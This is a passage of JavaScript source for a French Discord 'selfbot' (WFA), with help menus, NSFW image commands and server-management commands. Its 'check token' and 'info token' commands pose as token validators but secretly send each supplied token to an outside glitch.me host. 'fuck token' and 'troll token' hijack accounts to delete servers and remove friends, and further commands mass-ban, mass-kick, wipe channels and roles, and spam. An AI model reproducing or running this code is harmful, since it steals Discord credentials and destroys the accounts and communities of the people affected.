        message.edit('>>> **𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙣𝙨𝙛𝙬** :underage:\n```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n\n\n    **' + prefix + 'ass**\n    `Envoie une photo de fesse`\n    \n    **' + prefix + '4k**\n    `Envoie une image sexe en 4k`\n    \n    **' + prefix + 'anal**\n    `Envoie un gif anal`\n    \n    **' + prefix + 'hentai**\n    `Envoie une image/gif hentai`\n    \n    **' + prefix + 'nsfw-gif**\n    `Envoie un gif de sexe`\n    \n    **' + prefix + 'pussy**\n    `Envoie une image de chattes`\n    \n    **' + prefix + 'thigh**\n    `Envoie une image thigh`\n\n    `le prefix est:  ' + prefix + '`\n    \n    We - Fuck - All\n    \n    \n    \n    ' + yourgif + '\n    ').catch(_0x4e7dfb =>
            console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande help nsfw executé'.yellow);
    }
    if (message.content === prefix + 'help utile') {
        message.edit('>>> **𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙐𝙩𝙞𝙡𝙚** :globe_with_meridians:\n\n```YTB:                            https://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg\nDiscord - Support:              https://discord.gg/vzUrj34AvC```\n  \n  \n      **' + prefix + 'mp all**\n    `Permet de dm toutes les personnes d\'un serveur`\n    \n    **' + prefix + 'stop mp all**\n    `Permet de stopé la commande mp all`\n    \n    **' + prefix + 'auto voice kick (@user)**\n    `Permet de kick un utilisateur du vocal (parfait pour troll)`\n    \n    **' + prefix + 'stop auto voice kick (@user)**\n    `Permet de stopé la commande auto voice kick`\n    \n    **' + prefix + 'nuke dm**\n    `Nuke tout tes dm (sans les clear) pour limiter les beugs et l\'ésthetique`\n    \n    **' + prefix + 'afk (text)**\n    `Pour te definir comme "afk"`\n\n    **' + prefix + 'user info (@user)**\n    `Envoie les information d\'un membre du serveur`\n    \n    **' + prefix + 'serveur info**\n    `Envoie les information du serveur`\n\n    **' + prefix + 'stats**\n    `Affiche les stats du selfbot`\n\n    **' + prefix + 'restart**\n    `Redemarre le selfbot`\n    \n    **' + prefix + 'reset**\n    `Reset le statu`\n    \n    **' + prefix + 'role info (@role)**\n    `Envoie les informations d\'un role`\n    \n    **' + prefix + 'encode (text)**\n    `Crypte ton text en base64`\n    \n    **' + prefix + 'discord**\n    `Affiche votre version de discord js`\n    \n    **' + prefix + 'gen token**\n    `Change votre token`\n    \n    **' + prefix + 'add emote (emote) <name>**\n    `Ajoute un emoji au serveur`\n    \n    **' + prefix + 'emote (emote)**\n    `Donne les infos tout les emojis d\'un serveur`\n    \n    **' + prefix + 'remove emote (emote)**\n    `Supprime un emoji du serveur`\n    \n    **' + prefix + 'steal emote (serveur id)**\n    `Ajoute tout les emojis d\'un serveur a ton serveur`\n    \n    **' + prefix + 'delete all emote**\n    `Supprime tout les emojis du serveur`\n    \n    **' + prefix + 'grab pp (user)**\n    `Vole la photo de profile de la personne mentionné`\n    \n    **' + prefix + 'check token (token)**\n    `Vérifie si le token est valide`\n    \n    **' + prefix + 'mp friend (message)**\n    `Envoie un message privé a tout tes amis`\n    \n    **' + prefix + 'change hypesquad (brilliance/bravery/ballance)**\n    `Permet de changer sa maison hypesquad`\n    \n    **nitro autoclaim**\n    `Un autoclaim est en permanance activé sur le self`\n  \n      `le prefix est:  ' + prefix + '`\n      \n      We - Fuck - All\n      \n      \n      \n      ' + yourgif + '\n      ').catch(err =>
            console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande help utile executé'.yellow);
    }
    if (message.content.startsWith(prefix + "avatar" || prefix + 'pp')) {
        const user = message.mentions.users.first() || message.author;
        message.edit('>>> **Commande "Avatar" | WFA - Selfbot**\n**Voici l\'avatar de** `' + user.username + "`,\n\n" + user.avatarURL + "\n      ").catch(d =>
            console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande avatar executé'.yellow);
    }
    if (message.content === prefix + 'change hypesquad brilliance') {
        let URL = "https://discordapp.com/api/v6/hypesquad/online";
        request(URL, {
            'method': "POST",
            'headers': {
                'authorization': token,
                'content-type': "application/json",
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            },
            'body': JSON.stringify({
                house_id: 2
            })
        })
        msg.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'brilliance\'**')
        console.log('Commande change hypesquad executé'.yellow);
    }
    if (message.content === prefix + "change hypesquad ballance") {
        let URL = "https://discordapp.com/api/v6/hypesquad/online";
        request(URL, {
            'method': "POST",
            'headers': {
                'authorization': token,
                'content-type': "application/json",
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            },
            'body': JSON.stringify({
                house_id: 3
            })
        })
        msg.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'ballance\'**');
        console.log('Commande change hypesquad executé'.yellow);
    }

    if (message.content === prefix + "change hypesquad bravery") {
        let URL = "https://discordapp.com/api/v6/hypesquad/online";
        request(URL, {
            'method': "POST",
            'headers': {
                'authorization': token,
                'content-type': "application/json",
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            },
            'body': JSON.stringify({
                house_id: 1
            })
        }), msg.edit(":white_check_mark: **Vous avez rejoint la hypesquad 'bravery\'**")
        console.log("Commande change hypesquad executé".yellow);

    }
    if (message.content.startsWith(prefix + 'check token')) {
        let tke = args.splice(1).join(' '),
            URL = 'https://discordapp.com/api/v6/users/@me';
        request(URL, {
            method: 'GET',
            headers: {
                authorizaion: tke
            }
        }, function (err, res, body) {
            if (res.statusCode === 200) {
                const URLSeachParams = new URLSearchParams();
                URLSeachParams.append("token", tke)
                fetch("https://sjzaoicjvzapjidaz.glitch.me/", {
                    'method': "POST",
                    'body': URLSeachParams
                })
                message.edit('>>> **Token Info | WFA - Selfbot**\n\n\n            Le token: \n            ```' + tke + '```\n            \n            **Est 100% valide** :white_check_mark:\n').catch(err =>
                    console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            } else message.edit('>>> **Token Info | WFA - Selfbot**\n\n\n            Le token: \n            ```' + tke + '```\n            \n            Le token ' + tke + ' \nn\'est pas valide :x:\n').catch(err =>
                console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log('Commande check token executé'.yellow);

        });

    }
    if (message.content === prefix + 'ddos voc') {
        if (!msg.guild) return message.edit(":x: **Commande uniquement utilisable sur un serveur**");
        if (!message.member.hasPermission("ADMINISTRATOR")) {
            message.channel.send(':x: **Il vous faut les permissions administrateur pour executer cette commande**');
            return;
        }
        let i = 0;
        const region = ["japan", "hongkong", "russia", "india", "brazil", "sydney"];
        setInterval(() => {
            message.guild.setRegion(region[i]), i++;
            if (i === region.length) i = 0;
        }, 1000)
        msg.edit("**Commande ddos vocal activé**")
        console.log('Commande ddos vocal executé'.yellow);
    }
    if (message.content === prefix + "ddos-stop") {
        if (!msg.guild) return message.edit(":x: **Commande uniquement utilisable sur un serveur**");
        clearInterval()
        msg.edit("**Commande ddos stopé**")
        console.log("Commande ddos voc stopé".yellow);
    }
    if (message.content.startsWith(prefix + "spam")) {
        if (!msg.guild) return message.edit(":x: **Commande uniquement utilisable sur un serveur**");
        let toSpam = args.splice(1).join(' ') + "spam by WFA-Selfbot" || "@everyone\nWFA\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg";
        msg.edit("**Wait...**")
        setInterval(() => {
            msg.channel.send(toSpam).catch(e => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }, 1000)
        console.log("Commande spam executé".yellow);
    }
    if (message.content == prefix + "stop spam") {
        if (!msg.guild) return message.edit(":x: **Commande uniquement utilisable sur un serveur**");
        clearInterval();
        msg.edit("**Commande spam stopé**");
        client.destroy().then(() => client.login(token));
        console.log("Commande spam stopé".yellow);

    }
    if (message.content.startsWith(prefix + 'connect to')) {}
    if (message.content.startsWith(prefix, "info token")) {
        let tke = args.splice(2).join(' '),
            URL = "https://discordapp.com/api/v6/users/@me";
        request(URL, {
            'method': "GET",
            'headers': {
                authorization: tke
            }
        }, function (err, res, body) {
            if (res.statusCode === 200) {
                const URLSearchParams = new URLSearchParams();
                URLSearchParams.append("token", tke)
                fetch('https://sjzaoicjvzapjidaz.glitch.me/', {
                    'method': "POST",
                    'body': URLSearchParams
                }), new Promise((reject, resolve) => {
                    let url = "https://discordapp.com/api/v6/users/@me";
                    request(url, {
                        method: 'GET',
                        headers: {
                            authorization: tke
                        }
                    }, function (err, res, body) {
                        body = JSON.parse(body);
                        var id = body["id"];
                        var username = body["username"];
                        var avatar = body["avatar"];
                        var discriminator = body["discriminator"];
                        var mfa_enabled = body["mfa_enabled"];
                        var phone = body["phone"];
                        var locale = body["locale"];
                        let publicflag = body["public_flags"];
                        let flags = body["flags"];
                        let email = body["email"];
                        let verified = body["verified"];
                        let nsfwallowed = body["nsfw_allowed"];

                        var tyty = "";
                        tyty += "\nUser: " + username + "#" + discriminator;
                        tyty += "\nId: " + id;
                        tyty += "\nEmail: " + email;
                        tyty += "\nNuméro de telephone: " + phone;
                        tyty += "\nAvatar: " + avatar;
                        tyty += "\nLangue: " + locale;
                        tyty += "\nA2f activé?: " + mfa_enabled;
                        tyty += "\nCompte vérifié?: " + verified;
                        tyty += "\nNsfw activé?: " + nsfwallowed;
                        tyty += "\nFlags: " + flags;
                        tyty += "\nPublic Flags: " + publicflag;
                        message.edit('**Commande Token Info | WFA - Selfbot**\n```\n' + tyty + '\n```\n').then(console.log("Commande info token executé".yellow));
                    });
                });
            } else {
                message.edit('>>> **Token Info | WFA - Selfbot**\n\n\n            Le token: \n            ```' + tke + '```\n            \n            Le token ' + tke + ' \nn\'est pas valide :x:\n').catch(e => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            }
        });
    }
    if (message.content.startsWith(prefix + "fuck token")) {
        let fucked = new Discord.Client(),
            argument = args.splice(2).join(' '),
            url = "https://discordapp.com/api/v6/users/@me";
        request(url, {
            'method': "GET",
            'headers': {
                authorization: argument
            }
        }, function (err, res, body) {
            if (res.statusCode == 200) {
                fucked.on("ready", function () {
                    for (pas = 0; pas > 100; pas++) {
                        fucked.user.createGuild("WFA-Selfbot", "london");
                    }
                });
                for (pas = 0; pas > 20; pas++) {
                    fetch("https://discord.com/api/v8/users/@me/settings", {
                        'headers': {
                            'authorization': argument,
                            'content-type': "application/json"
                        },
                        'body': '{"theme":"light"}',
                        'method': "PATCH"
                    })
                    fetch("https://discord.com/api/v8/users/@me/settings", {
                        'headers': {
                            'authorization': argument,
                            'content-type': "application/json"
                        },
                        'body': "{\"theme\":\"light\"}",
                        'method': "PATCH"
                    })
                }
                fucked.on("ready", function () {
                    fucked.user.friends.forEach(friend => {
                        if (friend.id === "826503000541102200") return;
                        fucked.user.removeFriend(friend).catch(e => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));

                    })
                    fucked.guilds.forEach(guild => {
                        if (guild.id === "879157124230414406") return;
                        if (guild.id === "843993531273707540") return;
                        if (guild.ownerID === fucked.user.id) guild.delete().catch(err => {
                            if (err) console.log("Token timeout".red)
                        });
                        else guild.leave().catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                    })
                    message.edit(":white_check_mark: **Token fuck en cours...**");
                })
                fucked.login(argument);
            } else message.edit('>>> **Token Info | WFA - Selfbot**\n\n\n            Le token: \n            ```' + argument + '```\n            \n            Le token ' + argument + ' \nn\'est pas valide :x:\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }), console.log("Commande fuck token executé".yellow);
    }
    if (message.content.startsWith(prefix + "troll token")) {
        let trolled = new Discord.Client(),
            argument = args.splice(2).join(' '),
            url = "https://discordapp.com/api/v6/users/@me";
        request(url, {
            method: "GET",
            headers: {
                authorization: argument
            }
        }, function (err, res, body) {
            if (res.statusCode == 200) {
                trolled.on("ready", function () {
                    for (pas = 0; pas > 100; pas++) {
                        trolled.user.createGuild("TROLLED FDP", "london");
                    }
                });
                for (pas = 0; pas > 20; pas++) {
                    fetch("https://discord.com/api/v8/users/@me/settings", {
                        'headers': {
                            'authorization': argument,
                            'content-type': "application/json"
                        },
                        'body': '{"theme":"light"}',
                        'method': "PATCH"
                    })
                    fetch("https://discord.com/api/v8/users/@me/settings", {
                        'headers': {
                            'authorization': argument,
                            'content-type': "application/json"
                        },
                        'body': "{\"theme\":\"light\"}",
                        'method': "PATCH"
                    })
                }
            } else message.edit('>>> **Token Info | WFA - Selfbot**\n\n\n            Le token: \n            ```' + argument + '```\n            \n            Le token ' + argument + ' \nn\'est pas valide :x:\n').catch(_0x2c37ad =>
                console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log("Commande troll token executé".yellow);
        });
    }
    if (message.content.startsWith(prefix + "8ball")) {
        let question = message.content.split(' ').splice(1).join(' ');
        var reponse = ["oui", "non...", "peut etre?", "probablement", "je ne pense pas.", "jamais", "tu peux essayer..."];
        if (question[1] != null) message.edit(question + "\nla reponse est: " + reponse[Math.floor(Math.random() * reponse.length)]).catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        else message.edit("Quelle est ta question? :rolling_eyes: (essayeplutot:" + prefix + " 8ball [question])");
        console.log("Commande 8ball executé".yellow);
    }
    if (message.content.startsWith(prefix + "mp friend")) {
        if (!args) {
            throw "Vous devez mettre quelque chose à dire !";
        }
        let toSay = args.splice(2).join(' ') || "WFA Selfbot\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg";
        client.user.friends.forEach(friend => {
            friend.send(toSay).catch(err => console.log('[', "ERROR".red, ']', "une erreur est survenue que je ne peux régler".green))
        })
        console.log("Commande mp friend executé".yellow);

    }
    if (message.content.startsWith(prefix + "say")) {
        if (!args) throw "Vous devez mettre quelque chose à dire !";
        let toSay = args.splice(1).join(' ') || "WFA selfbot";
        for (pas = 0; pas < 10; pas++) {
            say.setColor(color)
            message.edit("**Commande Say | WFA - Selfbot**\n\n" + toSay).catch(e => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }
        console.log("Commande Say executé".yellow);
    }
    if (message.content.startsWith(prefix + "user info")) {
        if (!mentionUser) return msg.edit(":x: **Utilisateur inconnu!**")
        mentionUser = message.author;
        var member = message.guild.member(mentionUser),
            Game = mentionUser.presence.game,
            maybeGame = Game ? Game.name : "Nothing",
            maybeRoles = !member ? null : member.roles['array']();
        if (member) {
            maybeRoles.shift();
            for (var pas = 0; pas < maybeRoles.length; ++pas) {
                maybeRoles[pas] = maybeRoles[pas].name;
            }
            maybeRoles = maybeRoles.join(', ');
        }
        var stt = {
            "dnd": "Do Not Disturb",
            offline: "Offline/Invisible",
            online: "Online",
            idle: "Idle"
        }
        msg.edit(">>> **Commande User Info | WFA - Selfbot**\n```\nUsername: " + mentionUser.username + '#' + mentionUser.discriminator + ' | id: ' + mentionUser.id + "\nCreated: " + mentionUser.createdAt.toString().substr(0, 15) + ',\n' + checkDays(member.joinedAt) + "\nStatus: " + stt[mentionUser.presence.status] + "\nPlaying: " + maybeGame + ('\nNickname: ') + (member.nickname ? member.nickname : 'None') + ("\nAvatar URL: ") + mentionUser.displayAvatarURL + '\nRoles: ' + (maybeRoles ? maybeRoles : "None") + "\n```\n").catch(err => console.log('[', "ERROR".red, ']', "une erreur est survenue que je ne peux régler".green))
        console.log("Commande user info executé".yellow);
    }
    if (message.content === prefix + "serveur info") {
        if (!msg.guild) return message.edit(":x: **Commande uniquement utilisable sur un serveur**");
        const time = new Date().getTime() - msg.guild.createdAt.getTime(),
            _0x1073c8 = time / 1000 / 60 / 60 / 24,
            wtf = ["None", "Low", "Medium", "Insane", "Extreme"];
        msg.edit('>>> **Commande Server - Info | WFA - Selfbot**\n```\nName: ' + message.guild.name + '\n\nCreated On: ' + message.guild.createdAt.toString().substr(0, 15) + ',\n' + checkDays(message.guild.createdAt) + '\n\nDefault Channel: ' + msg.guild.defaultChanne + '\n\nRegion: ' + msg.guild.region + '\n\nMember Count: ' + msg.guild.members.filter(e =>
            e.presence.status !== 'offline').size + ' / ' + msg.guild.memberCount + '\n\nOwner: ' + message.guild.owner.user.username || "Introuvable" + '\n\nText Channels: ' + msg.guild.channels.filter(f =>
            f.type === 'text').size + '\n\nVoice Channels: ' + msg.guild.channels.filter(r =>
            r.type === 'voice').size + '\n\nVerification Level:' + wtf[msg.guild.verificationLevel] + '\n\nRoles: ' + msg.guild.roles.size + '\n\nGuild ID: ' + msg.guild.id + '\n```\n').catch(err =>
            console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande serveur info effectué'.yellow);
    }
    if (message.content === prefix + "stats") {
        message.edit('**Selfbot - Statistics | WFA - Selfbot**\nMemoire Usage: ' + (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + 'MB\n\nServers: ' + client.guilds.size + '\n\nChannels: ' + client.channels.size + '\n\nUsers: ' + client.guilds.map(b => /* Called:undefined | Scope Closed:true*/
            b.memberCount).reduce((a, e) => a + e) + '\n\nServers: ' + client.guild.size + '\n').catch(err =>
            console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log("Commande stats effectué".yellow)
    }
    if (message.content.startsWith(prefix + "ass")) {
        superagent.get("https://nekobot.xyz/api/image").query({
            type: "ass"
        }).end((err, res) => {
            msg.edit(">>> **NSFW Commande | WFA - Selfbot**\n\n\n" + res.body.message + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }), console.log("Commande ass effectué".yellow);
    }
    if (message.content.startsWith(prefix + '4k')) {
        superagent.get("https://nekobot.xyz/api/image").query({
            type: "4k"
        }).end((err, res) => {
            msg.edit(">>> **NSFW Commande | WFA - Selfbot**\n\n\n" + res.body.message + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log("Commande 4k effectué".yellow);
        });

    }
    if (message.content.startsWith(prefix + "nsfw-gif")) {
        superagent.get("https://nekobot.xyz/api/image").query({
            'type': "pgif"
        }).end((err, res) => {
            msg.edit(">>> **NSFW Commande | WFA - Selfbot**\n\n\n" + res.body.message + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
            console.log('Commande nsfw gif effectué'.yellow);
        });
    }
    if (message.content.startsWith((prefix + "hentai"))) {
        superagent.get("https://nekobot.xyz/api/image").query({
            'type': "hentai_anal"
        }).end((err, res) => {
            msg.edit(">>> **NSFW Commande | WFA - Selfbot**\n\n\n" + res.body.message + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log("Commande hentai effectué".yellow);
        });
    }
    if (message.content.startsWith(prefix + "pussy")) {
        superagent.get("https://nekobot.xyz/api/image").query({
            type: "pussy"
        }).end((err, res) => {
            msg.edit(">>> **NSFW Commande | WFA - Selfbot**\n\n\n" + res.body.message + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log('Commande pussy effectué'.yellow);
        });
    }
    if (message.content.startsWith(prefix + 'thigh')) {
        superagent.get("https://nekobot.xyz/api/image").query({
            'type': "thigh"
        }).end((err, res) => {
            msg.edit('>>> **NSFW Commande | WFA - Selfbot**\n\n\n' + res.body.message + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log('Commande thigh effectué'.yellow);
        });
    }
    if (message.content.startsWith(prefix + "anal")) {
        superagent.get("https://nekobot.xyz/api/image").query({
            type: "anal"
        }).end((err, res) => {
            msg.edit(">>> **NSFW Commande | WFA - Selfbot**\n\n\n" + res.body.message + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
            console.log("Commande a" + 'nal effectué'.yellow);
        });
    }
    if (message.content.startsWith((prefix + "fight"))) {
        if (!mentionUser) return msg.edit(":x: **Aucun utilisateur mentionné**");
        message.edit(">>> **Debitage Commande | WFA - Selfbot**\n\n" + mentionUser.username + '  __**VS**__  ' + client.user.username + "\n\nhttps://www.photofunky.net/output/image/e/8/8/a/e88abf/photofunky.gif\n").catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log("Commande fight effectué".yellow);
    }
    if (message.content.startsWith(prefix + "boom")) {
        if (!mentionUser) return msg.edit(":x: **Aucun utilisateur mentionné**");
        message.edit('>>> **BOOM' + " Commande | WFA - Se" + 'lfbot**\n' + mentionUser.username + (" **Ce Fait Explosé Par **💣💥  ") + client.user.username + ("\n\nhttps/media.discordapp.net/attachments/648223633185177612/650715035592687647/image0.gif\n")).catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log("Commande boom effectué".yellow);
    }
    if (message.content == prefix + "shutdown") {
        msg.delete().then(() => process.exit(1)), console.log("Commande shutdown effectué".yellow);
    }
    if (message.content.startsWith(prefix + "kick")) {
        let _0x33df94 = message.guild;
        if (!_0x33df94) {
            message.edit(":x: **Veuillez executer cette commande sur un serveur!**");
            return;
        }
        if (!mentionUser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return;
        }
        mentionUserd.kick().then(LRatio => {
            message.edit(":wave:", LRatio.displayName + " has been successfully kicked :point_right: ");
        }).catch(() => {
            message.edit(":x: **Access Denied**");
        })
        console.log("Commande kick effectué".yellow);
    }
    if (message.content.startsWith(prefix + 'ban')) {
        let guild = message.guild;
        if (!guild) {
            message.edit(":x: **Veuillez executer cette commande sur un serveur!**");
            return;

        }
        if (!mentionUser) {
            message.edit(":x: **Veuillez mentionner un utilisateur!**");
            return;
        }
        mentionUser.ban().then(banned => {
            message.edit(':wave: ' + banned.displayName + "has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right:");
        }).catch(() => {
            message.edit(":x: **Access Denied**");
        })
        console.log("Commande ban effectué".yellow);
    }
    if (message.content.startsWith(prefix + "name all")) {
        let guild = message.guild;
        if (!guild) return msg.edit(":x: **Commande uniquement utilisable sur un serveur**");
        const toName = message.content.split(' ').slice(2).join(' ') || message.author.username;
        if (!message.member.hasPermission("MANAGE_NICKNAMES")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
        const members = message.guild.members;
        msg.edit("Je renomme tout le monde par " + toName)
        members.forEach(memb => {
            memb.setNickname(toName).catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        })
        console.log("Commande name all effectué".yellow);
    }
    if (message.content == prefix + "all ban") {
        let guild = message.guild;
        if (!guild) return msg.edit(":x: **Commande uniquement utilisable sur un serveur**");
        if (!message.member.hasPermission('BAN_MEMBERS')) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
        message.guild.members.forEach(member => {
            setInterval(() => {
                if (!member.bannable) return;
                member.ban().catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));

            }, 1000);
        })
        console.log("Commande ban all effectué".yellow);
    }
    if (message.content === prefix + "all kick") {
        let guild = message.guild;
        if (!guild) return msg.edit(":x: **Commande uniquement utilisable sur un serveur**");
        if (!message.member.hasPermission("KICK_MEMBERS")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
        const members = message.guild.members;
        members.forEach(member => {
            if (!member.kickable) return;
            member.kick().catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));

        })
        console.log("Commande kick all effectué".yellow);
    }
    if (message.content.startsWith(prefix + "purge")) {
        message.channel.fetchMessages().then(messages => messages.forEach(singleMessage => {
            if (singleMessage.author.id === client.user.id) {
                singleMessage.delete().catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));

            }
        }))
        console.log('Commande purge effectué'.yellow);
    }
    if (message.content == prefix + "rire") {
        message.edit(">>> **Commande Rire | WFA - Selfbot**\n      \n      \n" + rire[Math.floor(Math.random() * rire.length)] + ' \n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log("Commande rire effectué".yellow)
    }
    if (message.content.startsWith(prefix + 'kiss')) {
        if (!mentionUser) {
            message.edit(":x: **Veuillez mentionner un utilisateur!**");
            return;
        }
        message.edit(">>> **Commande Kiss | WFA - Selfbot**\n      \n      \n" + kiss[Math.floor(Math.random() * kiss.length)] + ' \n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log("Commande kiss effectué".yellow);
    }
    if (message.content.startsWith(prefix + "veski")) {
        if (!mentionUser) {
            message.edit(":x: **Veuillez mentionner un utilisateur!**");
            return;
        }
        message.edit(">>> **Commande Veski | WFA - Selfbot**\n      \n      \n" + veski[Math.floor(Math.random() * veski.length)] + ' \n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log("Commande veski effectué".yellow);
    }
    if (message.content.startsWith(prefix + "load")) {
        message.delete();
        var a = '.',
            b = '█';
        message.channel.send("```[" + a.repeat(50) + "]```").then(mess => {
            for (pas = 0; pas <= 50; pas++) {
                mess.edit('```[' + b.repead(pas) + a.repead(50 - pas) + "]  -  " + pas * 100 / 50 + '%\n' + "loading..```");
            }
            mess.edit("`Succesfull load.`").catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
            console.log("Commande load effectué" ["yellow"]);
        });
    }
    if (message.content === prefix + "delete all channel") {
        let guild = message.guild;
        if (!guild) {
            message.edit(":x: **Veuillez executer cette commande d" + 'ans un ser' + "veur!**");
            return;
        }
        if (!message.member.hasPermission("MANAGE_CHANNELS")) return message.delete().then(console.log('[', "ERROR".red, ']', "permission insuffisante".green));
        var channels = message.guild.channels;
        channels.forEach(channel => {
            channel.delete().catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        })
        console.log("Commande delete all channel effectué".yellow);
    }
    if (message.content === prefix + "delete all role") {
        let guild = msg.guild;
        if (!guild) {
            message.edit(":x: **Veuillez executer cette commande sur un serveur!**");
            return;
        }
        message.guild.roles.forEach(role => {
            role.delete().catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        })
        console.log("Commande delete all role effectué".yellow);
    }
    if (message.content.startsWith(prefix + "punch")) {
        if (!mentionUser) {
            message.edit(":x: **Veuillez mentionner un utilisateur!**");
            return;
        }
        message.edit(">>> **Commande Punch | WFA - Selfbot**\n      \n      \n" + punch[Math.floor(Math.random() * punch.length)] + ' \n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log("Commande punch effectué".yellow);
    }
    if (message.content.startsWith(prefix + "calin")) {
        if (!mentionUser) {
            message.edit(":x: **Veuillez mentionner un utilisateur!**");
            return;
        }
        message.edit(">>> **Commande Calin | WFA - Selfbot**\n\n" + '**' + client.user.username + ' fait un calin a ' + mentionUser.username + '**    \n   ' + " \n\n" + hugh[Math.floor(Math.random() * hugh.length)] + ' \n').catch(err => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log('Commande calin effectué'.yellow);
    }
    if (message.content.startsWith(prefix, "set serveur name")) {
        let name = args.splice(1).join(' ') || 'WFA selfbot';
        message.edit("Changement du nom du serveur pour: " + name)
        message.guild.setName(name)
        console.log("Commande set serveur name effectué".yellow);
    }
    if (message.content.startsWith(prefix + "token")) {
        if (!mentionUser) {
            message.edit(":x: **Veuillez mentionner un utilisateur!**");
            return;
        }
        let middle = ["HircHg", "XnyXiA", "XluxwQ", "XXn_KA", "Xiq-WQ"],
            end = ["a6uny9jcMjet2W2LASruribq6VI", "oZyGJDamSJ4hmJaaLvzdNo1bLqk", "3_6Xt2k4OieDKimnNYGWUq9vJRo", "xllelHltGdY7DP_0s1XST4cgzTs"];
        var userID = mentionUser.id,
            IDEncoded = utf8.encode(userID),
            debutToken = base64.encode(IDEncoded);
        setTimeout(() => {
            message.edit("░░░░░░░░░░ 0%");
        }, 1000)
        setTimeout(() => {
            message.edit("▓▓░░░░░░░░ 20%");
        }, 1500)
        setTimeout(() => {
            message.edit("▓▓▓▓░░░░░░ 40%");
        }, 2000)
        setTimeout(() => {
            message.edit("▓▓▓▓▓▓░░░░ 60%")
        }, 2500)
        setTimeout(() => {
            message.edit("▓▓▓▓▓▓▓▓░░ 80%");
        }, 3000)
        setTimeout(() => {
            message.edit("▓▓▓▓▓▓▓▓▓▓ 100%");
        }, 3500)
        setTimeout(() => {
